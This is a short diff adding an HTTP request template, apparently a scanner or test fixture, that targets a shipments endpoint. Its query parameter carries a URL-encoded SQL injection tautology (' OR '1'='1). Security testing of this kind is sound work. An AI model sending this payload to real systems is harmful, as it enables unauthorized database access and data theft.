@@ -1,0 +1,2 @@
+GET {{TARGET}}/shipments?{{CARRIER_PARAM}}=SHP-204%27%20OR%20%271%27%3D%271 HTTP/1.1
+Accept: */*
